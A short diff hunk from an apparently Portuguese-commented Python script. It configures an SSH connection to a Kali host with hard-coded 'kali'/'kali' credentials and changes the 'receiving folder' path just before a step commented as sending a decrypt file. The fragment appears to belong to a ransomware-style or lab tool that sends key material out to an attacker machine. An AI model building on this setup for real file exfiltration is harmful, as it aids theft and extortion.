@@ -88,7 +88,7 @@ host = '192.168.15.18'
 user = 'kali'
 passwd = 'kali'
 
-path = '/home/kali/password' # Trocar a pasta receptora aqui
+path = '/home/kali/' # Trocar a pasta receptora aqui
 
 # Enviando Arquivo De Descrypt
 #Criando um objeto SSHClient
